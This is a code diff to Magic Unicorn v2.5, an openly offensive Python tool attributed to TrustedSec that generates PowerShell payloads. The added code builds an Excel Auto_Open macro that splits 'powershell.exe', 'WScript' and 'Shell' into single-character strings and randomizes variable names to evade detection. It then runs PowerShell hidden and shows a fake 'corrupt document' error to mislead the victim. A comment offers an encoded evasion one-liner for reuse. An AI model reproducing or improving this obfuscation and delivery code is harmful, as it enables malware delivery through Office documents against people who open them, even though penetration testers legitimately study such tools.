@@ -30,7 +30,7 @@ import string
 #
 def generate_random_string(low, high):
     length = random.randint(low, high)
-    letters = string.ascii_letters + string.digits
+    letters = string.ascii_letters #+ string.digits
     return ''.join([random.choice(letters) for _ in range(length)])
 
 # needed for color in unicorn eyes
@@ -195,7 +195,7 @@ The last one will use a 500 character string instead of the default 380, resulti
 
 # usage banner
 def gen_usage():
-    print("-------------------- Magic Unicorn Attack Vector v2.4.3 -----------------------------")
+    print("-------------------- Magic Unicorn Attack Vector v2.5 -----------------------------")
     print("\nNative x86 powershell injection attacks on any Windows platform.")
     print("Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)")
     print("Twitter: @TrustedSec, @HackingDave")
@@ -225,10 +225,45 @@ def write_file(path, text):
     file_write.close()
 
 
+# scramble commmands into multiple strings
+def scramble_stuff():
+    ps = "powershell.exe"
+    list = ""
+    for letter in ps:
+        letter = '"' + letter.rstrip() + '" & '
+        list = list + letter
+
+    full_exe = list[:-2]
+    ps_only = full_exe.split(".")[0][:-4]
+
+
+    wscript = "WScript"
+    shell = "Shell"
+    list2 = ""
+    for letter in wscript:
+        letter = '"' + letter.rstrip() + '" & '
+        list2 = list2 + letter
+
+    full_wscript = list2[:-2]
+
+    list3 = ""
+    for letter in shell:
+        letter = '"' + letter.rstrip() + '" & '
+        list3 = list3 + letter
+
+    full_shell = list3[:-2]
+
+    return full_exe + "," + ps_only + "," + full_wscript + "," + full_shell
+
+
+
 # generate full macro
 def generate_macro(full_attack, line_length=380):
+    # randomize macro name
+    macro_rand = generate_random_string(5, 10)
+
     # start of the macro
-    macro_str = "Sub Auto_Open()\nDim x\nx = "
+    macro_str = ("Sub Auto_Open()\nDim {0}\n{1} = ".format(macro_rand, macro_rand))
 
     if line_length is None:
         line_length_int = 380
@@ -244,11 +279,39 @@ def generate_macro(full_attack, line_length=380):
     macro_str = macro_str[:-4]
     # remove first occurrence of &
     macro_str = macro_str.replace("& ", "", 1)
-    macro_str = macro_str.replace('powershell -w 1 -C "', r'powershell -w 1 -noprofile -C \""')
+    macro_str = macro_str.replace('powershell -w 1 -C "', r'powershell -w 1 -nop -C \""')
     macro_str = macro_str.replace(''''"''', r''''\""''')
 
-    # end of macro
-    macro_str += """"\nShell ("powershell.exe " & x)\nDim title As String\ntitle = "Critical Microsoft Office Error"\nDim msg As String\nDim intResponse As Integer\nmsg = "This document appears to be corrupt or missing critical rows in order to restore. Please restore this file from a backup."\nintResponse = MsgBox(msg, 16, title)\nApplication.Quit\nEnd Sub"""
+
+    # obfsucate the hell out of Shell and PowerShell
+    long_string = scramble_stuff().split(",")
+    
+    # full powershell.exe
+    ps_long = long_string[0]
+
+    # ps abbreviated
+    ps_short = long_string[1][1:]
+
+    # wscript
+    wscript = long_string[2]
+
+    #shell
+    shell = long_string[3]
+
+    macro_str = macro_str.replace('powershell -w 1', ps_short + ' & " -w 1')
+    macro_str = macro_str.replace(';powershell', ';" & "' + ps_short + ' & "')
+
+    # randomized variables
+    function1 = generate_random_string(5, 15)
+    function2 = generate_random_string(5, 15)
+    function3 = generate_random_string(5, 15)
+    function4 = generate_random_string(5, 15)
+    function5 = generate_random_string(5, 15)
+    function6 = generate_random_string(5, 15)
+
+    # our final product of obfsucated code
+    macro_str +=("""\n\nDim {0}\n{1} = {2}\nDim {3}\n{4} = {5}\nDim {6}\n{7} = {8} & "." & {9}\nDim {10}\nDim {11}\nSet {12} = VBA.CreateObject({13})\n{14} = {15} & " "\n{16} = {17}.Run({18} & {19}, 0, False)\nDim title As String\ntitle = "Microsoft Corrupt Excel Document"\nDim msg As String\nDim intResponse As Integer\nmsg = "The document appears to be made on an older version of Microsoft. Please have the creator save to a newer and supported format."\nintResponse = MsgBox(msg, 16, title)\nApplication.Quit\nEnd Sub""".format(function1,function1,shell,function2,function2,wscript,function3,function3,function2,function1,function4,function5,function4,function3,function6,ps_long,function5,function4,function6,macro_rand))
+
     return macro_str
 
 
@@ -390,10 +453,10 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
     print("Twitter: @TrustedSec, @HackingDave")
     print("\nHappy Magic Unicorns.")
 
-    ran1 = generate_random_string(1, 2)
-    ran2 = generate_random_string(1, 2)
-    ran3 = generate_random_string(1, 2)
-    ran4 = generate_random_string(1, 2)
+    ran1 = generate_random_string(1, 3)
+    ran2 = generate_random_string(1, 3)
+    ran3 = generate_random_string(1, 3)
+    ran4 = generate_random_string(1, 3)
 
     # powershell -w 1 -C "powershell ([char]45+[char]101+[char]99) YwBhAGwAYwA="  <-- Another nasty one that should evade. If you are reading the source, feel free to use and tweak
     #"sv x -;sv y ec;sv Z ((gv x).value.toString()+(gv y).value.toString());powershell (gv Z).value.toString()"
